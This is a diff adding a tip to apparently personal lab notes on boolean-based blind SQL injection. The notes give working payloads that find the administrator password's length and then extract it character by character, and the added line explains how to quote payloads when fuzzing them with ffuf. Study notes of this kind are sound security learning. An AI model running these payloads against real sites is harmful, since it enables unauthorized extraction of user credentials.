@@ -34,3 +34,5 @@
 - First, guess the **length of password**: `' and (select username from users where username = 'administrator' and length(password) > 1) = 'administrator' --`, `' and (select username from users where username = 'administrator' and length(password) < 15) = 'administrator' --`, `' and (select username from users where username = 'administrator' and length(password) = 20) = 'administrator' --`. --> **Password length = 20**
 - Then, **guess the first letter** by fuzzing with alpha-numer wordlist: `' and (select substring(password,1,1) from users where username = 'administrator') = 'word-list' --`. --> **first letter is: l** --> meaning so far everything is correct.
 - Finally, **guess the whole password** with 2 wordlists and quite some time. `' and (select substring(password,number-list,1) from users where username = 'administrator') = 'alpha-num-list' --` 
+
+**Note:** When using **ffuf** to fuzz it, **do not do this: `'FUZZ2'`, do this: `FUZZ2` with `' '` for each letter inside the wordlist** 
